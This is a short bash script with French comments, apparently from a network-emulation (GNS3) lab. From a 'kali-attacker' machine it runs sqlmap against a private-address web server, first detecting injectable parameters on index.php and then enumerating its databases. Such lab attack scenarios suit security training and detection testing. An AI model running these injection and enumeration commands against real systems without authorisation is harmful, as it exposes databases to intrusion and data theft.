#!/bin/bash
# Scénario C — Injection SQL (sqlmap)
# Itération : 2
# Cible : web-eurostar 10.0.10.10
# Exécuter depuis la machine kali-attacker dans GNS3

TARGET="http://10.0.10.10"

echo "[*] Scénario C — Injection SQL sqlmap"
echo "[*] Cible : $TARGET"
echo "[*] Début : $(date)"

# Phase 1 : détection des paramètres injectables
echo "[*] Phase 1 : détection"
sqlmap -u "$TARGET/index.php?id=1" --batch --level=2

# Phase 2 : extraction du schéma de base de données
echo "[*] Phase 2 : énumération des bases"
sqlmap -u "$TARGET/index.php?id=1" --batch --dbs

echo "[*] Fin : $(date)"
